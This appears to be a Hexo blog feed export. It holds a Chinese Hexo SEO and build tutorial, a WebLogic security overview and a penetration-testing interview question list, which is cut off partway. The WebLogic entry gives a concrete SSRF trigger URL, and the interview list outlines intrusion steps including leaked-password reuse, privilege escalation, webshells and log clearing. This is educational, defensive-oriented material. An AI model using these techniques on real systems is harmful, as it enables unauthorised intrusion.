推送成功时,会有如下终端提示主动推送成功提示  各种不同的推送反馈字段说明在这里查看,一般来说,推送失败基本都是地址不相符造成的,我们只需对比baidu_url_submit在public中生成的baidu_urls.txt的地址,与自己填写在host字段中的地址对比看是否一样即可。  1.1.3.2 设置自动推送 在主题配置文件下设置,将baidu_push设置为true: # Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO baidu_push: trueYml 然后主题文件目录加入下面代码，一般在目录/themes/matery/layout/_partial中的head.ejs中加入下面JS代码（有可能你的目录不是这样，原理类似），这样全站都有了： &lt;% if (theme.baidu_push) { %&gt;     <script>         (function(){             var bp = document.createElement('script');             var curProtocol = window.location.protocol.split(':')[0];             if (curProtocol === 'https') {                 bp.src = '<a href="https://zz.bdstatic.com/linksubmit/push.js&#39;">https://zz.bdstatic.com/linksubmit/push.js&#39;</a>;                     }             else {                 bp.src = '<a href="http://push.zhanzhang.baidu.com/push.js&#39;">http://push.zhanzhang.baidu.com/push.js&#39;</a>;             }             var s = document.getElementsByTagName("script")[0];             s.parentNode.insertBefore(bp, s);         })();     </script> &lt;% } %&gt; Js 这样每次访问博客中的页面就会自动向百度提交sitemap 1.1.3.3 sitemap方式 将我们上一步生成的sitemap文件提交到百度就可以了</del>将sitemap提交到百度我记得被百度收录过程还是蛮久的，一度让我以为我的方法有问题，提交链接在站长工具中有显示大概是有两天的时候，站点被百度收录大概花了半个月= =，让大家看一下现在的成果在百度搜索site:sunhwee.com已经可以搜索到结果站点已被百度收录在搜索框输入域名也可以找到站点站点已被百度收录输入关键字的名字也可以在第二页就找到呢，好开森<del>站点已被百度收录 1.2 让google收录你的站点 1.2.1 操作步骤相比于百度，google的效率实在不能更快，貌似十分钟左右站点就被收录了，其实方法是和百度是一样的。 google站点平台：<a href="https://www.google.com/webmasters/">https://www.google.com/webmasters/</a>    注册账号 验证站点 提交sitemap   向 google 添加 sitemap 后: 进入 Google Search Console - 抓取 - 站点地图,点击「添加/测试站点地图」,输入你的博客网址. 若无报错则站点地图提交成功  sitemap提交成功 一步一步来就好，过不了过久就可以被google收录了站点已被google收录 站点已被google收录 站点已被google收录 1.2.2 提交 robots.txt:robots.txt 是一种存放于网站根目录下的 ASCII 编码的文本文件，它的作用是告诉搜索引擎此网站中哪些内容是可以被爬取的，哪些是禁止爬取的。robots.txt 放在博客目录下的 source 文件夹中，博客生成后在站点目录 /public/ 下。 我的 robots.txt 文件内容如下： User-agent: * Allow: / Allow: /archives/ Allow: /categories/ Allow: /about/ Disallow: /js/ Disallow: /css/ Disallow: /fonts/ Disallow: /vendors/Yml robots.txt 文件更新至网站后可进入 Google Search Console - 抓取 - robots.txt 测试工具进行测试。 这里部分参考自Hexo博客搜索 SEO优化-谷歌篇 1.3 让其他搜索引擎收录你的站点 除了百度和google两大搜索引擎，还有搜狗、360等其他的搜索引擎，流程都是一样的，大家就自行选择添加哈，这里就不再赘述了</del> 1.4 优化你的url seo搜索引擎优化认为，网站的最佳结构是用户从首页点击三次就可以到达任何一个页面，但是我们使用hexo编译的站点打开文章的url是：sitename/year/mounth/day/title四层的结构，这样的url结构很不利于seo，爬虫就会经常爬不到我们的文章，于是，我们需要优化一下网站文章url 方案一： 我们可以将url直接改成sitename/title的形式，并且title最好是用英文，在根目录的配置文件下修改permalink如下： url: <a href="https://sunhwee.com/">https://sunhwee.com</a> root: / permalink: :title.html permalink_defaults:Yml 方案二： 使用插件优化url 插件hexo-abbrlink实现了这个功能，它将原来的URL地址重新进行了进制转换和再编码。 安装hexo-abbrlink。 npm install hexo-abbrlink –saveBash 配置博客根目录下的_config.yml文件。 # permalink: :title/ permalink: archives/:abbrlink.html abbrlink:   alg: crc32  # 算法：crc16(default) and crc32   rep: hex    # 进制：dec(default) and hexYml 运行hexo clean和hexo g命令来重新生成文件看看，可以清楚的看到，URL结构成功变为了3层。 1.5 其他seo优化 seo优化应该说是一个收益延迟的行为，可能你做的优化短期内看不到什么效果，但是一定要坚持，seo优化也是有很深的可以研究的东西，从我们最初的网站设计，和最基础的标签的选择都有很大的关系，网站设计就如我们刚刚说的，要让用户点击三次可以到达网站的任何一个页面，要增加高质量的外链，增加相关推荐（比如说我们经常见到右侧本站的最高阅读的排名列表），然后就是给每一个页面加上keyword和描述 在代码中，我们应该写出能让浏览器识别的语义化HTML，这样有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；并且对外链设置nofollow标签，避免spider爬着爬着就爬出去了（减少网站的跳出率），并且我们要尽量在一些比较大的网站增加我们站点的曝光率，因为spider会经常访问大站，比如我们在掘金等技术社区发表文章中带有我们的站点，这样spider是很有可能爬到我们中的站点的，so….  网站外链的推广度、数量和质量 网站的内链足够强大 网站的原创质量 网站的年龄时间 网站的更新频率（更新次数越多越好） 网站的服务器 网站的流量：流量越高网站的权重越高 网站的关键词排名：关键词排名越靠前，网站的权重越高 网站的收录数量：网站百度收录数量越多，网站百度权重越高 网站的浏览量及深度：用户体验越好，网站的百度权重越高  2. 优化代码块样式 由于代码高亮插件prism_plugin的样式没有行号显示和代码块整体复制功能，不是很方便，为了优化观感和易用性，我们可以对其进行修改：待续…… 2.1 给代码块开启行号 我们在配置文件.yml中找到prism_plugin配置项line_number: false（# default false）改为true，开启行号，但是在我们这个matery主题中中是无效的，有bug需要改一下matery.css样式参数,在第95行位置将： pre {     padding: 1.5rem !important;     margin: 1rem 0 !important;     background: #272822;     overflow: auto;     border-radius: 0.35rem;     tab-size: 4; }Css 改为： pre {     padding: 1.5rem 1.5rem 1.5rem 3.3rem !important;     margin: 1rem 0 !important;     background: #272822;     overflow: auto;     border-radius: 0.35rem;     tab-size: 4; }Css 注释掉紧接着的code代码块里面的font-size项，如下： code {     padding: 1px 5px;     font-family: Inconsolata, Monaco, Consolas, ‘Courier New’, Courier, monospace;     /<em>font-size: 0.91rem;</em>/     color: #e96900;     background-color: #f8f8f8;     border-radius: 2px; }Css 好了这下可以显示行号了，如图：代码块显示行号 2.2 添加代码块复制功能 3. 优化网站加载速度 3.1 优化图片加载 issue问题：优化网站加载逻辑问题：图片最后加载，加入图片懒加载方法 hexo-lazyload-image的作用原理是讲你博客里面img标签的src属性替换为一个loading image，把真实的图片地址放在data-origin属性下面。然后当你的网页翻到那张图片时（也就是图片在窗口中完全可见时），他会有一段js用data-origin的内容替换src，打到懒加载的目的。 一般情况下懒加载和gallery插件会发生冲突，比如按照我上面所说，最终结果就会变成，可能只有第一张图片在gallery中打开是原图，右翻左翻都会是那张loading image，需要你掌握js，可以修改matery.js里面的内容，甚至可能换一个gallery，比如photosiwpe之类的 解决方法：修改/themes/matery/source/js中的matery.js文件 第103行： $(‘#articleContent, #myGallery’).lightGallery({     selector: ‘.img-item’,     // 启用字幕     subHtmlSelectorRelative: true,     showThumbByDefault: false   //这句加上 });Js 后面加上： $(document).find(‘img[data-original]’).each(function(){     $(this).parent().attr(“href”, $(this).attr(“data-original”)); });Js 再装个插件，<a href="https://github.com/Troy-Yang/hexo-lazyload-image%E5%9C%A8%E5%8D%9A%E5%AE%A2%E6%A0%B9%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE.yml%E6%96%87%E4%BB%B6%E5%8A%A0%E5%85%A5%E5%AF%B9%E5%BA%94%E5%AD%97%E6%AE%B5%EF%BC%8C%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/Troy-Yang/hexo-lazyload-image在博客根目录配置.yml文件加入对应字段，如下：</a> # lazyload configuration  2019.08.23 lazyload:   enable: true    onlypost: false   loadingImg:     # eg ./images/loading.gifYml 好了，这样实现了博客网站的图片懒加载。 3.2 Gulp实现代码压缩 Gulp实现代码压缩，以提升网页加载速度。 1 首先我们需要安装Gulp插件和5个功能模块，依次运行下面的两条命令。 npm install gulp –save  #安装gulp # 安装功能模块 npm install gulp-htmlclean gulp-htmlmin gulp-minify-css gulp-uglify gulp-imagemin –save # 额外的功能模块 npm install gulp-debug gulp-clean-css gulp-changed gulp-if gulp-plumber gulp-babel babel-preset-es2015 del –saveBash 2 接下来在博客的根目录下新建gulpfile.js文件，并复制下面的内容到文件中。 var gulp = require(“gulp”); var debug = require(“gulp-debug”); var cleancss = require(“gulp-clean-css”); //css压缩组件 var uglify = require(“gulp-uglify”); //js压缩组件 var htmlmin = require(“gulp-htmlmin”); //html压缩组件 var htmlclean = require(“gulp-htmlclean”); //html清理组件 var imagemin = require(“gulp-imagemin”); //图片压缩组件 var changed = require(“gulp-changed”); //文件更改校验组件 var gulpif = require(“gulp-if”); //任务 帮助调用组件 var plumber = require(“gulp-plumber”); //容错组件（发生错误不跳出任务，并报出错误内容） var isScriptAll = true; //是否处理所有文件，(true|处理所有文件)(false|只处理有更改的文件) var isDebug = true; //是否调试显示 编译通过的文件 var gulpBabel = require(“gulp-babel”); var es2015Preset = require(“babel-preset-es2015”); var del = require(“del”); var Hexo = require(“hexo”); var hexo = new Hexo(process.cwd(), {}); // 初始化一个hexo对象  // 清除public文件夹 gulp.task(“clean”, function() {   return del([“public/<em>/“]); }); // 下面几个跟hexo有关的操作，主要通过hexo.call()去执行，注意return // 创建静态页面 （等同 hexo generate） gulp.task(“generate”, function() {   return hexo.init().then(function() {     return hexo       .call(“generate”, {         watch: false       })       .then(function() {         return hexo.exit();       })       .catch(function(err) {         return hexo.exit(err);       });   }); }); // 启动Hexo服务器 gulp.task(“server”, function() {   return hexo     .init()     .then(function() {       return hexo.call(“server”, {});     })     .catch(function(err) {       console.log(err);     }); }); // 部署到服务器 gulp.task(“deploy”, function() {   return hexo.init().then(function() {     return hexo       .call(“deploy”, {         watch: false       })       .then(function() {         return hexo.exit();       })       .catch(function(err) {         return hexo.exit(err);       });   }); }); // 压缩public目录下的js文件 gulp.task(“compressJs”, function() {   return gulp     .src([“./public//</em>.js”, “!./public/libs/“]) //排除的js     .pipe(gulpif(!isScriptAll, changed(“./public”)))     .pipe(gulpif(isDebug, debug({ title: “Compress JS:” })))     .pipe(plumber())     .pipe(       gulpBabel({         presets: [es2015Preset] // es5检查机制       })     )     .pipe(uglify()) //调用压缩组件方法uglify(),对合并的文件进行压缩     .pipe(gulp.dest(“./public”)); //输出到目标目录 }); // 压缩public目录下的css文件 gulp.task(“compressCss”, function() {   var option = {     rebase: false,     //advanced: true,               //类型：Boolean 默认：true [是否开启高级优化（合并选择器等）]     compatibility: “ie7” //保留ie7及以下兼容写法 类型：String 默认：’’or’’ [启用兼容模式； ‘ie7’：IE7兼容模式，’ie8’：IE8兼容模式，’’：IE9+兼容模式]     //keepBreaks: true,             //类型：Boolean 默认：false [是否保留换行]     //keepSpecialComments: ‘’      //保留所有特殊前缀 当你用autoprefixer生成的浏览器前缀，如果不加这个参数，有可能将会删除你的部分前缀   };   return gulp     .src([“./public/**/.css”, “!./public/<em>/.min.css”]) //排除的css     .pipe(gulpif(!isScriptAll, changed(“./public”)))     .pipe(gulpif(isDebug, debug({ title: “Compress CSS:” })))     .pipe(plumber())     .pipe(cleancss(option))     .pipe(gulp.dest(“./public”)); }); // 压缩public目录下的html文件 gulp.task(“compressHtml”, function() {   var cleanOptions = {     protect: /<!--%fooTemplate\b.?%-->/g, //忽略处理     unprotect: /&lt;script [^&gt;]\btype=”text/x-handlebars-template”[\s\S]+?&lt;<span class="token operator">/script&gt;/gi //特殊处理   };   var minOption = {     collapseWhitespace: true, //压缩HTML     collapseBooleanAttributes: true, //省略布尔属性的值  <input checked="true"/> ==&gt; <input />     removeEmptyAttributes: true, //删除所有空格作属性值    <input id="" /> ==&gt; <input />     removeScriptTypeAttributes: true, //删除<script>的type="text/javascript"     removeStyleLinkTypeAttributes: true, //删除<style>和<link>的type="text/css"     removeComments: true, //清除HTML注释     minifyJS: true, //压缩页面JS     minifyCSS: true, //压缩页面CSS     minifyURLs: true //替换页面URL   };   return gulp     .src("./public/</em>/.html”)     .pipe(gulpif(isDebug, debug({ title: “Compress HTML:” })))     .pipe(plumber())     .pipe(htmlclean(cleanOptions))     .pipe(htmlmin(minOption))     .pipe(gulp.dest(“./public”)); }); // 压缩 public/uploads 目录内图片 gulp.task(“compressImage”, function() {   var option = {     optimizationLevel: 5, //类型：Number  默认：3  取值范围：0-7（优化等级）     progressive: true, //类型：Boolean 默认：false 无损压缩jpg图片     interlaced: false, //类型：Boolean 默认：false 隔行扫描gif进行渲染     multipass: false //类型：Boolean 默认：false 多次优化svg直到完全优化   };   return gulp     .src(“./public/medias/<em>/.</em>“)     .pipe(gulpif(!isScriptAll, changed(“./public/medias”)))     .pipe(gulpif(isDebug, debug({ title: “Compress Images:” })))     .pipe(plumber())     .pipe(imagemin(option))     .pipe(gulp.dest(“./public”)); }); // 执行顺序： 清除public目录 -&gt; 产生原始博客内容 -&gt; 执行压缩混淆 -&gt; 部署到服务器 gulp.task(   “build”,   gulp.series(     “clean”,     “generate”,     “compressHtml”,     “compressCss”,     “compressJs”,     “compressImage”,     gulp.parallel(“deploy”)   ) ); // 默认任务 gulp.task(   “default”,   gulp.series(     “clean”,     “generate”,     gulp.parallel(“compressHtml”, “compressCss”, “compressImage”, “compressJs”)   ) ); //Gulp4最大的一个改变就是gulp.task函数现在只支持两个参数，分别是任务名和运行任务的函数Js 3 最后 hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d 就可以了。  注意，很可能你会运行到第三步，也就是运行gulp压缩命令时会报错，如图所示：  gulp运行错误 那是因为gulp安装的本地版本和hexo自带的版本不对应导致，第三步gulp压缩可以用下面命令强制使用本地版本： node ./node_modules/gulp/bin/gulp.jsBash 3.3 Github &amp; Coding Pages 双部署 Github &amp; Coding Pages 双部署,对国内,国外用户进行分流访问,以提升网站的访问速度.Github Pages 的部署前面已经说了,这里就讲一讲 Coding Pages 如何部署.其实与 Github Pages 也类似,先到coding官网注册,创建一个与用户名同名的仓库,添加仓库地址到配置文件中,在根目录_config.yml对应地方添加如下: # Deployment ## Docs: <a href="https://hexo.io/docs/deployment.html">https://hexo.io/docs/deployment.html</a> deploy: - type: git   repo:     github: <a href="https://github.com/shw2018/shw2018.github.io.git">https://github.com/shw2018/shw2018.github.io.git</a>  # github 仓库地址     coding: <a href="https://git.dev.tencent.com/sunhwee/sunhwee.git">https://git.dev.tencent.com/sunhwee/sunhwee.git</a>   # coding 仓库地址   branch: master - type: baidu_url_submitterYml 把本地生成 SSH 公匙添加到 Coding 这一步看我前面的教程,原理类似. 然后 hexo clean &amp;&amp;　hexo  g  &amp;&amp; hexo d 部署上去就是了． 当然，部署上去后，你需要开启 page 服务. 你可以在 pages 设置里面自定义域名，区域名解析控制台，添加两条 CNAME 记录，将域名指向RepoName.coding.me就可以的，申请 ssl 证书，强制开启https  可能遇到的问题:  ［coding pages 申请ssl 证书总是提示：错误！］这里提一句，如果你是github pages 和 coding pages双部署，用同一个域名的话，可以将xxx.github.io 解析成 境外, xxx.coding.me 解析成 默认,这个时候如果你之前就申请过 ssl 证书的话，再在 coding 里面申请 ssl证书会一直提示 失败,解决办法： 先去域名解析控制台，将境外解析的两条 CNAME 记录 暂停,过个五六分钟，回到 coding 点击申请 ssl,很快就会提示，申请成功！ 刚好我过程中遇到了这个问题，所以把它记下来，方便后面的小伙伴看到． 3. 一些注意事项 3.1 备份博客源文件 有时候我们想换一台电脑继续写博客，最简单的方法就是把博客整个目录拷贝过去，就是这么暴力。不过，这种方法有个问题就是要是那天电脑崩了，本地源文件丢失了，比较麻烦，所以这时候就可以将博客目录下的所有源文件都上传到github上面。 首先在github博客仓库下新建一个分支hexo，然后git clone到本地，把.git文件夹拿出来，放在博客根目录下。 然后git branch -b hexo切换到hexo分支，然后git add .，然后git commit -m “xxx”，最后git push origin hexo提交就行了。 具体效果可以看我的博客源文件仓库：传送门。 大家也可以先用下文hexo安装方法安装完hexo，然后直接git clone -b hexo <a href="https://github.com/shw2018/shw2018.github.io.git%E5%85%8B%E9%9A%86%E6%88%91%E7%9A%84%E6%89%80%E6%9C%89%E6%BA%90%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E6%98%AF%E6%88%91%E7%9B%AE%E5%89%8D%E4%BF%AE%E6%94%B9%E5%AE%8C%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B2%A1bug%E7%9A%84%E5%AE%9A%E5%88%B6%E5%8C%96%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8B%BF%E6%9D%A5%E7%94%A8%E3%80%82">https://github.com/shw2018/shw2018.github.io.git克隆我的所有源文件，这是我目前修改完的基本没bug的定制化的博客，可以直接拿来用。</a> 持续更新中…，如果遇到问题欢迎联系我，在文章最后评论区【留言和讨论】，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于WebLogic安全性探讨</title>
      <link href="/2020/08/19/jiami/"/>
      <url>/2020/08/19/jiami/</url>
      
        <content type="html"><![CDATA[<h2 id="1-什么是WebLogic"><a href="#1-什么是WebLogic" class="headerlink" title="1    什么是WebLogic"></a>1    什么是WebLogic</h2><p>WebLogic是美国bea公司出品的一个webserver，如同我们使用的IIS，APACHE，确且的说是一个基于j2ee**<a href="http://lib.csdn.net/base/architecture">架构</a>**的中间件，webserver是用来构建网站的必要软件用来解析发布网页等功能，它是用纯<a href="http://lib.csdn.net/base/java"><strong>Java</strong></a>开发的。目前WebLogic在世界webserver市场上占有最大的份额，其他还有像IBM的websphere，免费的tomcat、resin等webserver软件。<span id="more"></span></p><p>WebLogic对于整日游走于安全行业的人来说并不陌生，网站拥有者可利用WebLogic搭建web服务，可充分利用其扩展性、部署灵活、支持多种标准等优势来；所谓没有绝对的安全，所以作为成熟的产品WebLogic每年也会出现各种命令执行、反序列等通用漏洞，而做为攻击者就可充分利用这些漏洞去攻击系统危害用户利益。</p><p>WebLogic在世界排名前10的国家如下：</p><p><img src="https://image.3001.net/images/20190331/1554005314_5ca03d42934f0.png!small" alt="图片.png"></p><p>通过初步统计，WebLogic在国内的应用范围比较广，支撑着很多企业的核心业务，尤其是在金融、电力、政府等行业，其中还有很多内网应用系统。</p><p>国内中间件利用情况统计图如下：</p><p><img src="https://image.3001.net/images/20190331/1554005324_5ca03d4c0ca82.png!small" alt="图片.png"></p><h2 id="2-WebLogic漏洞分析"><a href="#2-WebLogic漏洞分析" class="headerlink" title="2    WebLogic漏洞分析"></a>2    WebLogic漏洞分析</h2><p>随着近几年互联网的安全日益重视，WebLogic也被曝出大量漏洞，通过查看cve相关资料，最早的WebLogic漏洞是<a href="http://cve.scap.org.cn/CVE-2000-0499.html">CVE-2000-0499</a>，存在于是WebLogic3.1.8到4.5.1之间的版本，远程攻击者可通过该漏洞来查看jsp程序的源码，通过cve官方统计从2000年至今WebLogic已经被爆出268个漏洞。</p><p>WebLogic被曝出多个反序列化漏洞，Oracle官方相继发布了一系列反序列化漏洞补丁。但是近期，WebLogic又被曝出之前的反序列化漏洞补丁存在绕过安全风险，用户更新补丁后，仍然存在被绕过并成功执行远程命令攻击的情况。</p><p>序列化指的是把对象转换成字节流，便于保存在内存、文件、数据库中；而反序列化则是其逆过程，由字节流还原成对象。Java中ObjectOutputStream类的writeObject()方法可以实现序列化，ObjectInputStream类的readObject()方法用于反序列化。</p><p>java类ObjectInputStream在执行反序列化时，并不会对自身的输入进行检查，这就说明恶意攻击者可能也可以构建特定的输入，在ObjectInputStream类反序列化之后会产生非正常结果，利用这一方法就可以实现远程执行任意代码。</p><p>WebLogic采用黑名单的方式过滤危险的反序列化类，所以只要找到不在黑名单范围内的反序列化类就可以绕过过滤，执行系统命令。这次的漏洞就是利用了这一点，通过 JRMP（Java Remote Messaging Protocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议）协议达到执行任意反序列化内容。</p><p>恶意攻击者可利用反序列话漏洞，通过构造恶意请求报文远程执行命令，如查看服务器上相关敏感文件、进行木马的远程上传等，致使用户敏感文件泄露，服务器遭受攻击等，存在反序列化漏洞的站点如下：</p><p>除了反序列化漏洞，WebLogic还有存在ssrf、弱口令、xss等安全漏洞，SetupUDDIExploer.jsp就存在ssrf和xss漏洞，xss利用代码如下：</p><p>Ssrf漏洞代码如下</p><p>通过提交如下url：</p><p><a href="http://10.158.244.198:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.158.242.100:8080&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%87%BA%E5%8F%91ssrf%E6%BC%8F%E6%B4%9E">http://10.158.244.198:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.158.242.100:8080&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search，即可出发ssrf漏洞</a></p><h2 id="3-WebLogic漏洞统计"><a href="#3-WebLogic漏洞统计" class="headerlink" title="3    WebLogic漏洞统计"></a>3    WebLogic漏洞统计</h2><p>对WebLogic爆发的通用型漏洞统计如下：  </p><table><thead><tr><th align="center">cve名称</th><th align="center">影响版本</th><th align="center">漏洞危害</th></tr></thead><tbody><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10178.html">CVE-2017-10178</a></td><td align="center">10.3.6.0,12.1.3.0,  12.2.1.1 ，12.2.1.2.</td><td align="center">Unauthenticated attacker with network  access via HTTP to compromise Oracle WebLogic Server</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10148.html">CVE-2017-10148</a></td><td align="center">10.3.6.0,  12.1.3.0, 12.2.1.1 and 12.2.1.2</td><td align="center">allows unauthenticated attacker with  network access via T3 to compromise Oracle WebLogic Server</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10147.html">CVE-2017-10147</a></td><td align="center">10.3.6.0,  12.1.3.0, 12.2.1.1 and 12.2.1.2</td><td align="center">allows unauthenticated attacker with  network access via T3 to compromise Oracle WebLogic Server</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10137.html">CVE-2017-10137</a></td><td align="center">10.3.6.0  and 12.1.3.0</td><td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Server</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10123.html">CVE-2017-10123</a></td><td align="center">12.1.3.0</td><td align="center">allows low privileged attacker with  network access via HTTP to compromise Oracle WebLogic Server.</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-10063.html">CVE-2017-10063</a></td><td align="center">10.3.6.0,  12.1.3.0, 12.2.1.1 and 12.2.1.2</td><td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Serve</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-3531.html">CVE-2017-3531</a></td><td align="center">12.1.3.0,  12.2.1.0, 12.2.1.1 and 12.2.1.2</td><td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Server</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-3506.html">CVE-2017-3506</a></td><td align="center">10.3.6.0,  12.1.3.0, 12.2.1.0, 12.2.1.1 and 12.2.1.2</td><td align="center">allows unauthenticated attacker with  network access via HTTP to compromise Oracle WebLogic Server</td></tr><tr><td align="center"><a href="http://cve.scap.org.cn/CVE-2017-3248.html">CVE-2017-3248</a></td><td align="center">10.3.6.0,  12.1.3.0, 12.2.1.0 and 12.2.1.1</td><td align="center">allows unauthenticated attacker with  network access via T3 to compromise Oracle WebLogic Server.</td></tr></tbody></table><h2 id="4-如何防范WebLogic漏洞"><a href="#4-如何防范WebLogic漏洞" class="headerlink" title="4    如何防范WebLogic漏洞"></a>4    如何防范WebLogic漏洞</h2><p>由于WebLogic承载着系统应用的发布，所以其重要性也是不可估量，那么我们该怎么去面对WebLogic的漏洞，来保障系统的安全，可采用如下措施：</p><p>Ø 经常关注weblogi的安全情况，对其爆发的最新漏洞进行及时升级或打补丁；</p><p>Ø 尽量关闭WebLogic在公网上的开放，仅限于在内网进行维护、管理；</p><p>Ø 修改WebLogic的默认端口7001以及后台的默认访问路径；</p><p>Ø 定期对服务器进行巡检，查看是否有文件被恶意修改；</p><p>Ø 部署waf等安全措施，可以在一定程度上减轻该漏洞的危害；</p><p>Ø 如果业务不需要UDDI功能，就关闭这个功能可以删除uddiexporer文件夹；</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试面试问题合集</title>
      <link href="/2020/08/08/mianshi/"/>
      <url>/2020/08/08/mianshi/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试面试问题合集"><a href="#渗透测试面试问题合集" class="headerlink" title="渗透测试面试问题合集"></a>渗透测试面试问题合集</h1><h2 id="一、思路流程"><a href="#一、思路流程" class="headerlink" title="一、思路流程"></a>一、思路流程</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>a、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</p><p>b、网站指纹识别（包括，cms，cdn，证书等），dns记录</p><p>c、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p><span id="more"></span><p>e、子域名收集，旁站，C段等</p><p>f、google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</p><p>g、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</p><p>h、传输协议，通用漏洞，exp，github源码等</p><h3 id="2、漏洞挖掘"><a href="#2、漏洞挖掘" class="headerlink" title="2、漏洞挖掘"></a>2、漏洞挖掘</h3><p>a、浏览网站，看看网站规模，功能，特点等</p><p>b、端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心zang出血，mysql,ftp,ssh弱口令等。</p><p>c、XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p><h3 id="3、漏洞利用-amp-权限提升"><a href="#3、漏洞利用-amp-权限提升" class="headerlink" title="3、漏洞利用&amp;权限提升"></a>3、漏洞利用&amp;权限提升</h3><p>a、mysql提权，serv-u提权，oracle提权</p><p>b、windows 溢出提权</p><p>c、linux脏牛,内核漏洞提权e</p><h3 id="4、清除测试数据-amp-输出报告"><a href="#4、清除测试数据-amp-输出报告" class="headerlink" title="4、清除测试数据&amp;输出报告"></a>4、清除测试数据&amp;输出报告</h3><p>日志、测试数据的清理<br>总结，输出渗透测试报告，附修复方案</p><h3 id="5、复测"><a href="#5、复测" class="headerlink" title="5、复测"></a>5、复测</h3><p>验证并发现是否有新漏洞，输出报告，归档</p><h2 id="二、问题"><a href="#二、问题" class="headerlink" title="二、问题"></a>二、问题</h2><h3 id="1、拿到一个待检测的站，你觉得应该先做什么？"><a href="#1、拿到一个待检测的站，你觉得应该先做什么？" class="headerlink" title="1、拿到一个待检测的站，你觉得应该先做什么？"></a>1、拿到一个待检测的站，你觉得应该先做什么？</h3><p>信息收集<br>a、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p><p>b、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p><p>c、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p><p>d、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心zang出血，mysql,ftp,ssh弱口令等。</p><p>e、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>f、google hack 进一步探测网站的信息，后台，敏感文件</p><p>漏洞扫描<br>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p><p>漏洞利用<br>利用以上的方式拿到webshell，或者其他权限</p><p>权限提升<br>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p><p>日志清理</p><p>总结报告及修复方案</p><h3 id="2、判断出网站的CMS对渗透有什么意义？"><a href="#2、判断出网站的CMS对渗透有什么意义？" class="headerlink" title="2、判断出网站的CMS对渗透有什么意义？"></a>2、判断出网站的CMS对渗透有什么意义？</h3><p>查找网上已曝光的程序漏洞。</p><p>如果开源，还能下载相对应的源码进行代码审计。</p><h3 id="3-一个成熟并且相对安全的CMS，渗透时扫目录的意义？"><a href="#3-一个成熟并且相对安全的CMS，渗透时扫目录的意义？" class="headerlink" title="3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？"></a>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</h3><p>敏感文件、二级目录扫描</p><p>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p><h3 id="4-常见的网站服务器容器。"><a href="#4-常见的网站服务器容器。" class="headerlink" title="4.常见的网站服务器容器。"></a>4.常见的网站服务器容器。</h3><p>IIS、Apache、nginx、Lighttpd、Tomcat</p><h3 id="5-mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？"><a href="#5-mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？" class="headerlink" 